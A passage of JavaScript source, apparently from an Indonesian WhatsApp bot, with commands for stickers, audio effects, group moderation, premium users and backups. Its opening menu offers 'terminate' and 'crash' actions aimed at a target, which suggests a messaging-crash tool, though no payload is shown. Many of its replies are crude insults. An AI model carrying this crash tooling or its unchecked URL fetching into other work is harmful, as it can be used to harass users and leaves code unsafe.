id: `${prefix}terminate ${incTarget}`
},
{
header: "crash",
title: "➦",
id: `${prefix}crash ${incTarget}`
}
]
}
]
})
},
viewOnce: true
}
];
const buttonMessage = {
image: { url: "https://files.catbox.moe/netbqm.jpg" }, 
caption: caption,
footer: '© 𝐓𝐞𝐧𝐧𝐨𝐫𝐌𝐨𝐝𝐳 - 𝟸𝟶𝟸𝟻',
buttons: flowActions,
headerType: 1,
viewOnce: true,
contextInfo: {
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: "1234567891011@newsletter",
newsletterName: "It's time to terminate",
serverMessageId: 1
}
}
};
await conn.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;  
        
// Extract invite code from the link
case 'idch': case 'cekidch': {
if (!text) return reply("channel link?")
if (!text.includes("https://whatsapp.com/channel/")) return reply("Link must be valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await conn.newsletterMetadata("invite", result)
let teks = `* *ID : ${res.id}*
* *Name :* ${res.name}
* *Total Followers :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
interactiveMessage: {
body: {
text: teks }, 
footer: {
text: "by Vampire" }, //input watermark footer
  nativeFlowMessage: {
  buttons: [
             {
        "name": "cta_copy",
        "buttonParamsJson": `{"display_text": "copy ID","copy_code": "${res.id}"}`
           },
     ], },},
    }, }, },{ quoted : m });
await conn.relayMessage( msg.key.remoteJid,msg.message,{ messageId: msg.key.id }
);
}
break


  case "setpp": {
      if (!Access) return reply(mess.owner);
      if (!quoted) return reply(`mana photo? reply with a caption ${prefix + command}`);
      try {
          let mime = quoted.message?.imageMessage?.mimetype || quoted.mimetype || "";
          if (!mime.startsWith("image/")) return reply(`FOTO njrr`);
          if (/webp/.test(mime)) return reply(`sini muka lu ku tempelin stiker anjg!`);
          let media = await conn.downloadMediaMessage(quoted);
          if (!media) return reply(`gagal mengunduh gambar, coba lagi nanti!`);
          await conn.updateProfilePicture(botNumber, media);
          reply(`horee, foto profil berhasil di perbarui`);
      } catch (error) {
          console.error(error);
          reply(`aduhh, ada error nih : ${error}`);
      }
  }
  break 
        
  case 'owner': {
      conn.sendContact(m.chat, kontributor, m)
      conn.sendMessage(from, {
          text : `That is my owner`,
          mentions: [sender]
      }, { quoted: m })
  }
  break
        
case 'backup':
case 'bp':{
if (isBan) return
if (!Access) return reply(mess.owner)
const sessionPath = "./session";
    if (fs.existsSync(sessionPath)) {
        const files = fs.readdirSync(sessionPath);
        files.forEach((file) => {
            if (file !== "creds.json") {
                const filePath = path.join(sessionPath, file); 
                if (fs.lstatSync(filePath).isDirectory()) {
                    fs.rmSync(filePath, { recursive: true, force: true });
                } else {  
                    fs.unlinkSync(filePath);
                }
            }
        }
    );
}

    const ls = execSync("ls").toString().split("\n").filter(
        (pe) =>           
        pe != "node_modules" &&   
        pe != "package-lock.json" &&  
        pe != "yarn.lock" &&
        pe != "tmp" &&
        pe != ""
    );

    execSync(`zip -r backup.zip ${ls.join(" ")}`);
    await conn.sendMessage(global.owner, {
        document: fs.readFileSync("./backup.zip"),   
        fileName: "script.zip",
        mimetype: "application/zip",
        caption: "ini adalah file backup mu",
    }, { quoted: m });
    execSync("rm -rf backup.zip");
    await reaction(m.chat, '⚡')
}
break
        
case 'telestick':
  case 'stickertele':
     case 'stele':{
         if (isBan) return
         if (args.length == 0) return reply(`mana url nya? contoh : ${prefix + command} https://t.me/addstickers/bocchi_ryo_y0ursfunny_akaudon`); 
         if (!isPremium) return reply(mess.premium)
         if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {              
             let res = await Telesticker(args[0]);              
             await reaction(m.chat, "⚡")              
             if (m.isGroup && res.length > 30) {
                 await reply("sticker terdapat 30+ maka akan dikirim melalui private chat");
                 
                   for (let i = 0; i < res.length; i++) {
                       let encmedia = await conn.sendImageAsSticker(m.sender, res[i].url, m, { 
                           packname: global.packname, 
                           author: global.author });        
                       await fs.unlinkSync(encmedia);
                       await sleep(9000);
                   }
             } else {
                   for (let i = 0; i < res.length; i++) {
                       let encmedia = await conn.sendImageAsSticker(m.chat, res[i].url, m, {
                           packname: global.packname, 
                           author: global.author });
                       await fs.unlinkSync(encmedia)
                       await sleep(9000);           
                   }
               }
           }
       }
       break;
                
       case "banuser":
       case "banneduser":{
           if (isBan) return
           if (!Access) return reply(mess.owner)
           let who;
           try {
               if (m.isGroup)
                   who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender;
           } catch (err) {
               if (m.isGroup) who = text + "@s.whatsapp.net";
           }
           if (!who) return reply("tag atau reply yang mau di banned");
           const isBen = user_ban.includes(who);
           if (isBen) return reply(`${isBen} successfully banned!!`);
           user_ban.push(who);
           fs.writeFileSync("./start/lib/database/banned.json", JSON.stringify(user_ban, 2, null));
           await sleep(500);
           reply(who + "\npftt, di bann anjg aowkaowwk");
       }
       break;
                
       case "unbanneduser":
       case "unbanuser":{
           if (isBan) return
           if (!Access) return reply(mess.owner)
           let whe;
           try {
               if (m.isGroup)
                   whe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender;
           } catch (err) {
               if (m.isGroup) whe = text + "@s.whatsapp.net";
           }
           if (!whe) return reply("tag atau reply nomor yang mau di unban");
           user_ban.splice(whe, 1);
           fs.writeFileSync("./start/lib/database/banned.json", JSON.stringify(user_ban, 2, null));
           await sleep(500);
           reply(whe + "\ndah ke unban");
       }
       break;
                
       case "listbanuser":
       case "listbanned":{
           if (isBan) return
           if (!Access) return reply(mess.owner)
           var textban = `list user yang terbanned di database : *${user_ban.length}*`;
           await conn.sendMessage(m.chat, {
               text: textban,
               contextInfo: {
                   externalAdReply: {
                       title: `ずう Vampire Killer`,
                       body: "",
                       thumbnailUrl: cinahitam,
                       sourceUrl: 'https://Zyurzyen.tech',
                       mediaType: 1,
                       renderLargerThumbnail: true,
                   }
               }
           }, { quoted: m });
       }
       break;
                
case'stext':{
    if (isBan) return
    if (!text) return reply(`mau nulis apa ajg? contoh ${prefix + command} woi hitam`)
    await reaction(m.chat, "⚡")
    let json = {
        type: 'stories',
        format: 'png',
        backgroundColor: '#1b1e23',
        width: 512,
        height: 720,
        scale: 4,
        watermark: 'Laurine',
        messages: [{
            entities: 'auto',
            avatar: true,
            from: {
                id: 18,
                name: await conn.getName(m.sender),
                photo: {
                    url: await conn.profilePictureUrl(m.sender, 'image').catch(_ => "https://telegra.ph/file/320b066dc81928b782c7b.png")
                }
            },
            text: text 
        }, 
    ]};
    const { data } = await axios.post('https://dikaardnt.com/api/maker/quote', json);
    var media = Buffer.from(data.image, 'base64')
    var res = await uploadImage(media)
    conn.sendMessage(m.chat, {
        image: { url : res },
        caption: '' },{ quoted: m })
}
break
           
case "afk":{
    if (isBan) return
    if (!m.isGroup) return reply(mess.group);
    if (isAfkOn) return reply("lu kan lagi afk bjirr")
    let reason = text ? text : "gada bjirr";
    afk.addAfkUser(m.sender, Date.now(), reason, _afk);
    reply(`@${m.sender.split("@")[0]} AFK\nAlasan: ${reason}`);
}
break;
            
case 'tovocal':
  case 'getvocal':
    case 'vocal':{
        if (isBan) return
        if (!text) return reply(`lagu yang mau di ambil vocalnya? contoh : ${prefix + command} it will rain`)
        let search = await yts(text);
        await reaction(m.chat, "⚡")
        let telaso = search.all[0].url;
        let puqi = await VocalRemover(telaso);
          let vocalAudio = puqi.stuffs.find(item => item.bizType === 'vocal').key;
          conn.sendMessage(m.chat, {
              audio: { url : vocalAudio },
              mimetype: 'audio/mpeg', 
              ptt: true
          },{quoted:m})
        }
      break;
            
case 'remini':
  case 'hd':
    case 'hdr': {
        if (isBan) return
        if (!quoted || !/image/.test(mime)) return reply(`mana imagenya? reply image dengan caption ${prefix + command}`)          
        const peler = await quoted.download()              
        let getResult;             
        const ImgLarger = require("./lib/scrape/remini")    
        await reaction(m.chat, "⚡")
        const imgLarger = new ImgLarger();
        try {    
            const Logger = await imgLarger.processImage(peler, 4);
            getResult = Logger.data.downloadUrls[0];
            await conn.sendMessage(m.chat, {      
                image: { url: `${getResult}` }, 
                caption: `> *🍿 fetching - unlimited*

status: succes
creator: rasilius`
            },{ quoted: m });
        } catch (error) { 
            console.error('Proses gagal total:', error.message);        
        }
    }
    break;
        
case 'jodoh': {
    if (!m.isGroup) return reply(mess.group)
    let member = participants.map(u => u.id)
    let orang = member[Math.floor(Math.random() * member.length)]
    let jodoh = member[Math.floor(Math.random() * member.length)]
    reply(`@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`)
}
break
                
case 'banchat':{
    if (isBan) return
    if (!Access) return reply(mess.owner)
    if (global.db.data.chats[m.chat].isBanned = true) return reply("Sudah Active")
    global.db.data.chats[m.chat].isBanned = true
    reply("berhasil banchat")
}
break

case 'unbanchat':{
    if (isBan) return
    if (!Access) return reply(mess.owner)
    if (global.db.data.chats[m.chat].isBanned = false) return reply("Sudah Off")
    global.db.data.chats[m.chat].isBanned = false
    reply("berhasil unbanchat")
}
break
        
case 'bass': 
  case 'blown': 
    case 'deep': 
      case 'earrape': 
      case 'fast': 
      case 'fat': 
      case 'nightcore': 
      case 'reverse': 
      case 'robot': 
      case 'slow': 
      case 'smooth': 
      case 'tupai': {
          if (isBan) return
          if (!/audio/.test(mime)) return reply(`reply audio, dengan caption *${prefix + command}*`);
          let set;
          if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20';      
          if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log';       
          if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3';     
          if (/earrape/.test(command)) set = '-af volume=12';      
          if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"';      
          if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"';     
          if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25';        
          if (/reverse/.test(command)) set = '-filter_complex "areverse"';      
          if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"';   
          if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'; 
          if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"';    
          if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"';
          if (/audio/.test(mime)) {
              let media = await conn.downloadAndSaveMediaMessage(quoted);
              await reaction(m.chat, "⚡")
              let ran = getRandomFile('.mp3');
              exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                  fs.unlinkSync(media);
                  if (err) return reply(err);
                  let buff = fs.readFileSync(ran);        
                  sendMusic(buff);
                  fs.unlinkSync(ran);
              });
          }
      }
      break;
            
case 'toimage': 
  case 'toimg': {
      if (isBan) return
      if (!/webp/.test(mime)) return reply(`reply sticker dengan caption *${prefix + command}*`)
      let media = await conn.downloadAndSaveMediaMessage(quoted)
      await reaction(m.chat, "⚡")
      let ran = await getRandomFile('.png')  
      exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media)
          if (err) return err 
          let buffer = fs.readFileSync(ran)   
          conn.sendMessage(m.chat, {   
              image: buffer     
          }, { quoted: m })
          fs.unlinkSync(ran)
      }
    )
  }
  break
                
  case "pin":
  case "pinterest":{
      if (isBan) return
      if (!text) return reply(`mau nyari apa? contoh ${prefix + command} yaemiko`);
      await reaction(m.chat, "⚡")
      let anu = await pinterest(text);
      let result = anu[Math.floor(Math.random() * anu.length)];
      conn.sendButtonImg(m.chat,
        [
            {
                id: `${prefix + command} ${text}`,
                text: 'next',
                type: 1
            }
        ],"ini kak", result, "© ZuuStillLove - 2025", m, {viewOnce: true })
  }
  break;
  
  
                
  case 'h':
  case 'hidetag': {
      if (isBan) return
      if (!m.isGroup) return reply(mess.group)
      if (!isAdmins && !Access) return reply(mess.admin)
      if (m.quoted) {
          conn.sendMessage(m.chat, {
              forward: m.quoted.fakeObj,
              mentions: participants.map(a => a.id)
          })
      }
      if (!m.quoted) {
          conn.sendMessage(m.chat, {
              text: q ? q : '',
              mentions: participants.map(a => a.id)
          }, { quoted: m })
      }
  }
  break
                
  case "kick":
  case "kik":
  case "dor":{
      if (isBan) return
      if (!m?.isGroup) return reply(mess.group)
      if (!isAdmins) return reply(mess.admin)
      if (!isBotAdmins) return reply(mess.botadmin)
      if (!text && !m?.quoted) return reply(`siapa yang mau di kick njrr, contoh reply orang atau tag dengan caption ${prefix + command}`)
      let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
      await conn.groupParticipantsUpdate(m?.chat, [users], 'remove').catch(console.log)
  }
  break
                
  case 'cekkhodam': {
      if (isBan) return
      if (!text) return reply(`ketik nama lu anjg, contoh ${prefix + command} rido`)
      let who
      if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.sender;
      const anunya = [
	  "Kaleng Cat Avian",
	  "Pipa Rucika",
	  "Botol Tupperware",
	  "Badut Mixue",
	  "Sabun GIV",
	  "Sandal Swallow",
	  "Jarjit",
	  "Ijat",
	  "Fizi",
	  "Mail",
	  "Ehsan",
	  "Upin",
	  "Ipin",
	  "sungut lele",
	  "Tok Dalang",
	  "Opah",
	  "Opet",
	  "Alul",
	  "Pak Vinsen",
	  "Maman Resing",
	  "Pak RT",
	  "Admin ETI",
	  "Bung Towel",
	  "Lumpia Basah",
	  "Martabak Manis",
	  "Baso Tahu",
	  "Tahu Gejrot",
	  "Dimsum",
	  "Seblak Ceker",
	  "Telor Gulung",
	  "Tahu Aci",
	  "Tempe Mendoan",
	  "Nasi Kucing",
	  "Kue Cubit",
	  "Tahu Sumedang",
	  "Nasi Uduk",
	  "Wedang Ronde",
	  "Kerupuk Udang",
	  "Cilok",
	  "Cilung",
	  "Kue Sus",
	  "Jasuke",
	  "Seblak Makaroni",
	  "Sate Padang",
	  "Sayur Asem",
	  "Kromboloni",
	  "Marmut Pink",
	  "Belalang Mullet",
	  "Kucing Oren",
	  "Lintah Terbang",
	  "Singa Paddle Pop",
	  "Macan Cisewu",
	  "Vario Mber",
	  "Beat Mber",
	  "Supra Geter",
	  "Oli Samping",
	  "Knalpot Racing",
	  "Jus Stroberi",
	  "Jus Alpukat",
	  "Alpukat Kocok",
	  "Es Kopyor",
	  "Es Jeruk",
	  "Cappucino Cincau",
	  "Jasjus Melon",
	  "Teajus Apel",
	  "Pop ice Mangga",
	  "Teajus Gulabatu",
	  "Air Selokan",
	  "Air Kobokan",
	  "TV Tabung",
	  "Keran Air",
	  "Tutup Panci",
	  "Kotak Amal",
	  "Tutup Termos",
	  "Tutup Botol",
	  "Kresek Item",
	  "Kepala Casan",
	  "Ban Serep",
	  "Kursi Lipat",
	  "Kursi Goyang",
	  "Kulit Pisang",
	  "Warung Madura",
	  "Gorong-gorong",
]
      function getRandomKhodam() {
          const randomKhodam = Math.floor(Math.random() * anunya.length);
    return anunya[randomKhodam];
}
const khodam = getRandomKhodam()
      const response = ` 
> *Nama :* ${text}
> *Khodam :* ${khodam}`
      reply(response)
  }
  break
        
  case 'apakah': {
      if (isBan) return
      if (!q) return reply(`apa njrr? contoh ${prefix + command} saya wibu`)
      const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
      const kah = apa[Math.floor(Math.random() * apa.length)]
      reply(`pertanyaan : apakah ${q}\njawaban : ${kah}`)
  }
  break
                
  case 'bisakah': {
      if (isBan) return
      if (!q) return reply(`apaa njrr? contoh ${prefix + command} saya menjadi presiden`)
      const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!', 'naik anjing aja, naik anjing']
      const ga = bisa[Math.floor(Math.random() * bisa.length)]
      reply(`pertanyaan : apakah ${q}\njawaban : ${ga}`)
  } 
  break

  case 'bagaimanakah': {
      if (isBan) return
      if (!q) return reply(`apaa njrr? contoh ${prefix + command} cara mengatasi sakit hati`)
      const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Gimana yeee']
      const ya = gimana[Math.floor(Math.random() * gimana.length)]
      reply(`pertanyaan : apakah ${q}\njawaban : ${ya}`)
  }
  break
                
  case 'antilink': {
      if (isBan) return	
      if (!m.isGroup) return reply(mess.group)
      if (!isAdmins && !Access) return reply(mess.admin)		
      if (!isBotAdmins) return reply(mess.botdmin)
      if (!text) return reply(`silakan pilih opsinya, on/off, contoh ${prefix + command} on/off`)
      if (args[0] === "on") {
          if (global.db.data.chats[m.chat].antilink) return reply(`udaaa aktif`)
          global.db.data.chats[m.chat].antilink = true
          reply('successfully activate antilink in this group')
      } else if (args[0] === "off") {		
          if (!global.db.data[m.chat].antilink) return reply(`udah nonaktif`)
          global.db.data[m.chat].antilink = false
          reply('successfully disabling antilink in this group')
      }
  }
  break
          
 case 'tagme': {
     if (isBan) return
     if (!isGroup) return false;
     let menst = [m.sender];
     conn.sendMessage(m.chat, { 
         text: `@${m.sender.split('@')[0]}`,  
         mentions: menst        
     }
   )   
 }
 break
                
 case 'promote':
 case 'pm': {
     if (isBan) return
     if (!m.isGroup) return reply(mess.group)
     if (!Access && !isAdmins) return reply(mess.admin)
     if (!isBotAdmins) return reply(mess.botadmin)
     if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return reply('tag/reply pesan target yang ingin di jadikan admin!')
     let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
     if (!m.mentionedJid[0] && !m.quoted && !text) return reply(`tag/reply target yang mau di ${command}`)
     await reaction(m.chat, "⚡")
     await conn.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply('sukses promote member')).catch((err) => reply('terjadi kesalahan'))
 }
 break
                
 case 'demote':
 case 'dismiss': {
     if (isBan) return
     if (!m.isGroup) return reply(mess.group)
     if (!Access && !isAdmins) return reply(mess.admin)
     if (!isBotAdmins) return reply(mess.botadmin)
     if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return m.warning('tag/reply pesan target yang ingin di un admin!')
     let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
     if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`tag/reply target yang mau di ${command}`)
     await reaction(m.chat, "⚡")
     await conn.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply('sukses demote admin')).catch((err) => reply('terjadi kesalahan'))
 }
 break
                
case 'addprem': {
    if (isBan) return
    if (!Access) return reply(mess.owner)
    const kata = args.join(" ")
    const nomor = kata.split("|")[0];
    const hari = kata.split("|")[1];
    if (!nomor) return reply(`which number? contoh : ${prefix + command} @tag|30d`)
    if (!hari) return reply(`mau yang berapa hari njrr?`)
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    if (owner.includes(users)) return reply('lol, owner kan bebas')
    const idExists = _prem.checkPremiumUser(users)
    if (idExists) return reply('')
    let data = await conn.onWhatsApp(users)
    if (data[0].exists) {
        await reaction(m.chat, '🕑')
        _prem.addPremiumUser(users, hari)
        await sleep(3000)
        let cekvip = ms(_prem.getPremiumExpired(users) - Date.now())
        let teks = `sukses status premium
- User : @${users.split("@")[0]}
- Expired : ${hari.toUpperCase()}
- Countdown : ${cekvip.days} hours, ${cekvip.hours} minutes, ${cekvip.minutes} seconds`
        const contentText = {
            text: teks,
            contextInfo: {	
                mentionedJid: conn.ments(teks),
                externalAdReply: {
                    title: `premium user`,
                    previewType: "PHOTO",
                    thumbnailUrl: `https://pomf2.lain.la/f/dynqtljb.jpg`,
                    sourceUrl: 'https://Tennor.tech'
                }	
            }	
        };	
        return conn.sendMessage(m.chat, contentText, { quoted: m })
    } else {		
         reply("not found")
    }	
}
break
                
case 'delprem': {
    if (isBan) return
    if (!Access) return reply(mess.owner)
    if (!args[0]) return reply(`siapa yang mau di ${command}? gunakan nomor/tag, contoh : ${prefix}delprem @tag`)
    let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    const idExists = _prem.checkPremiumUser(users)
    if (!idExists) return reply("bukan user premium ini mah")
    let data = await conn.onWhatsApp(users)
    await reaction(m.chat, "⚡")
    if (data[0].exists) {	
        let premium = JSON.parse(fs.readFileSync('./start/lib/database/premium.json'));
        premium.splice(_prem.getPremiumPosition(users), 1)
        fs.writeFileSync('./start/lib/database/premium.json', JSON.stringify(premium))		
        reply('user tersebut telah di hapus')
    } else {	
        reply("not found")
    }
}
break

case 'peler':
case 'anj':
case 'memek':
case 'mmk':
case 'ajg':
case 'annjingg':
case 'kntl':
case 'puki':
case 'yatim':
case 'ytim':
case 'bangsat':
case 'kontol':
case 'stress':
case 'kimak':{
    reply(`lu juga ${command}`)
}
break
                
case 'addowner': {
    if (isBan) return
    if (!Access) return reply(mess.owner);
    if (!args[0]) return reply(`mana nomornya? contoh ${prefix + command} 628888`);
    const prem1 = text.split("|")[0].replace(/[^0-9]/g, '');
    const cek1 = await conn.onWhatsApp(`${prem1}@s.whatsapp.net`);
    if (cek1.length == 0) return reply("Enter a valid number registered on WhatsApp!")      
    kontributor.push(prem1);
    await reaction(m.chat, "⚡")
    fs.writeFileSync('./start/lib/database/owner.json', JSON.stringify(kontributor));
    reply(`sukses menjadikan ${prem1} sebagai owner`); 
    conn.sendMessage(`${prem1}@s.whatsapp.net`, { 
        text: `user, is now a vampire killer  owner`},{quoted:m}
           );
        }
        break;

case 'delowner': {
    if (isBan) return
    if (!Access) return reply(mess.owner);
    if (!args[0]) return reply(`mana nomornya? contoh ${prefix + command} 2548888`);
    const prem2 = text.split("|")[0].replace(/[^0-9]/g, '');
            const unp = kontributor.indexOf(prem2);
            if (unp !== -1) {
                kontributor.splice(unp, 1);
                await reaction(m.chat, "⚡")
                fs.writeFileSync('./start/lib/database/owner.json', JSON.stringify(kontributor));
                reply(`yah ${prem2} sudah bukan lagi bagian dari owner`);
            } else {
                reply(`${prem2} tidak ada dalam list owner.`);
            }
        }
        break;
            
        case 'public': {
            if (isBan) return
            if (!Access) return reply(mess.owner) 
            conn.public = true
            reply(`successfully changed to ${command}`)
        }
        break
            
        case 'self': {
            if (isBan) return
            if (!Access) return reply(mess.owner) 
            conn.public = false
            reply(`successfully changed to ${command}`)
        }
        break
            
case "jadibot": {
    if (isBan) return
    if (!Access && !isPremium) return reply('khusus user premium')
    await reaction(m.chat, '✅')
    try {
        await jadibot(conn, m, m.sender)
    } catch (error) {
        await reply(util.format(error), command)
    }
}
break
                
case "stopjadibot": {
    if (isBan) return
    if (!Access && !isPremium) return reply('khusus user premium')
    await reaction(m.chat, '✅')
    if (m.key.fromMe) return
    try {
        await stopjadibot(conn, m, m.sender)
    } catch (error) {
        await reply(util.format(error), command)
    }
}
break
			
case "listjadibot": {
    if (isBan) return
    if (!Access && !isPremium) return reply('khusus user premium')
    if (m.key.fromMe) return
    try {
        listjadibot(conn, m)
    } catch (error) {
        await reply(util.format(error), command)
    }
}
break

               
 case 'Author': {
    if (isBan) return
    let peler = `Thank you for using our script and here is a list of participating authors.

 *GiddyTennor*
> youtube.com/@Giddynokia
t.me/GiddyTennor

*Devorsixcore*
> youtube.com/@devorsixcore
t.me/devor6core

----------------------------------------------------------
And thanks to Zuu for base 
> youtube.com/@zuu.00
t.me/@zuuuucode

> without them, this script is nothing :)`
    conn.sendMessage(m.chat, { 
        text: peler,
        contextInfo: {
            mentionedJid: [m.sender],
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true,
                title: `ずう Vampire killer`,
                body: `A simple WhatsApp bot uses JavaScript to respond to commands automatically.`,
                mediaType: 1,
                thumbnailUrl: 'https://g.top4top.io/p_3243p0i8j1.jpg',
                thumbnail: ``,
                sourceUrl: `https://Tennor.tech`
            }
        }
    }, { quoted: m });
};
break;    

 
case 'tqto': {
    if (isBan) return
    let peler = `congratulations to those who have helped me to develop this script

> GiddyTennor (Developer)
> Zuu (Base)
> Devorsixcore (My Bf)
> My Self (motivation)

— participating teams
> Luxury-Corporation

> without them, this script is nothing :)`
    conn.sendMessage(m.chat, { 
        text: peler,
        contextInfo: {
            mentionedJid: [m.sender],
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true,
                title: `ずう Vampire Killer`,
                body: `A simple WhatsApp bot uses JavaScript to respond to commands automatically.`,
                mediaType: 1,
                thumbnailUrl: 'https://g.top4top.io/p_3243p0i8j1.jpg',
                thumbnail: ``,
                sourceUrl: `https://Zyurzyen.tech`
            }
        }
    }, { quoted: m });
};
break;    
        
case 'tourl': {
    if (isBan) return
    let q = m.quoted ? m.quoted : m
    let media = await quoted.download();
    await reaction(m.chat, "⚡")
    let uploadImage = require('./lib/uploadImage');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    const uploadFile = require('./lib/uploadFile')
    let link = await (isTele ? uploadImage : uploadFile)(media);  
    conn.sendMessage(m.chat, {
        text : `(no expiration date/unknown)\n ${link}`
    },{quoted:m})
}
break;       
            
case 'ping': {
    if (isBan) return
    const old = performance.now()
    const ram = (os.totalmem() / Math.pow(1024, 3)).toFixed(2) + " GB";
    const free_ram = (os.freemem() / Math.pow(1024, 3)).toFixed(2) + " GB";
    const serverInfo = `server information

> CPU : *${os.cpus().length} Core, ${os.cpus()[0].model}*
> Uptime : *${Math.floor(os.uptime() / 86400)} days*
> Ram : *${free_ram}/${ram}*
> Speed : *${(performance.now() - old).toFixed(5)} ms*`;
    conn.sendMessage(m.chat, {
        text: serverInfo
    },{ quoted:m})
}
break;
        
case 'speedtest': {
    if (isBan) return
    await reaction(m.chat, "⚡")
    const exec = promisify(cp.exec).bind(cp);
    let o;
    try {
        o = await exec('python3 speed.py --share --secure');
    } catch (e) {
        o = e;
    } finally {
        const { stdout, stderr } = o;
        if (stdout.trim()) {
            conn.relayMessage(m.chat, {
                extendedTextMessage: {
                    text: stdout,
                    contextInfo: {
                        externalAdReply: {
                            title: "S P E E D  T E S T",
                            mediaType: 1,
                            previewType: 0,
                            renderLargerThumbnail: true,
                            thumbnailUrl: cinahitam,
                            sourceUrl: `https://Zyurzyen.tech`
                        }
                    },
                    mentions: [m.sender]
                }
            }, {quoted:m});
        }
        if (stderr.trim()) reply(stderr);
    }
}
break;

case 'disk': {
    if (isBan) return
    exec('cd && du -h --max-depth=1', (err, stdout) => {
        if (err) return reply(`${err}`);
        if (stdout) return reply(stdout);
    });
}
break;
            
case 'sticker':
case 's':
case 'stiker': {
    if (isBan) return
    if (!quoted) return reply(`reply image/video dengan caption ${prefix + command}`);
    try {
        if (/image/.test(mime)) {
            const media = await quoted.download();
            await reaction(m.chat, "⚡")
            const imageUrl = `data:${mime};base64,${media.toString('base64')}`;
            await makeStickerFromUrl(imageUrl, conn, m);
        } else if (/video/.test(mime)) {
            if ((quoted?.msg || quoted)?.seconds > 10) return reply('Durasi video maksimal 10 detik!')
                const media = await quoted.download();
                const videoUrl = `data:${mime};base64,${media.toString('base64')}`;
                await makeStickerFromUrl(videoUrl, conn, m);
            } else {
                return reply('reply picture/video with caption .s (video duration 1-10 detik)');
            }
        } catch (error) {
            console.error(error);
            return reply('ooops. Error.');
        }
    }
    break;
            
      case'get':{
    if (isBan) return
        if (!/^https?:\/\//.test(text)) return reply(`mana url nya? contoh ${prefix + command} https://kyuurzy.site`);
        const ajg = await fetch(text);
          await reaction(m.chat, "⚡")
        if (ajg.headers.get("content-length") > 100 * 1024 * 1024) {
            throw `Content-Length: ${ajg.headers.get("content-length")}`;
        }

        const contentType = ajg.headers.get("content-type");
        if (contentType.startsWith("image/")) {
            return conn.sendMessage(
                m.chat,
                { image: { url: text } },
                { quoted: m }
            );
        }
        if (contentType.startsWith("video/")) {
            return conn.sendMessage(
                m.chat,
                { video: { url: text } },
                { quoted: m }
            );
        }
        if (contentType.startsWith("audio/")) {
            return conn.sendMessage(
                m.chat,
                { audio: { url: text },
                mimetype: 'audio/mpeg', 
                ptt: true
                },
                { quoted: m }
            );
        }
        
        let alak = await ajg.buffer();
        try {
            alak = util.format(JSON.parse(alak + ""));
        } catch (e) {
            alak = alak + "";
        } finally {
            return reply(alak.slice(0, 65536));
        }
      }
      break
            
      case'totag':{
        if (isBan) return
        if (!isAdmins) return reply(mess.admin);
        if (!m.isGroup) return reply(mess.group);
        if (!m.quoted) return reply(`reply pesan dengan caption ${prefix + command}`);
        const groupMetadata = await conn.groupMetadata(m.chat);
        const participants = groupMetadata.participants;

        conn.sendMessage(m.chat, {
            forward: m.quoted.fakeObj,
            mentions: participants.map((a) => a.id)
           }, { quoted: m });
         }
        break
            
      case'igdl':
      case'ig':{
        if (isBan) return
        if (!text) return reply(`provide link Instagram ? contoh ${prefix + command} https://`);
        let memek = await igdl(text);
          await reaction(m.chat, "⚡")
        let respon = memek.data.url_list;
        if (respon && respon.length > 0) {
            const mediaUrl = respon[0];

            try {
                const headResponse = await axios.head(mediaUrl);
                const mimeType = headResponse.headers['content-type'];

                const isImage = /image\/.*/.test(mimeType);
                const isVideo = /video\/.*/.test(mimeType);

                if (isImage) {
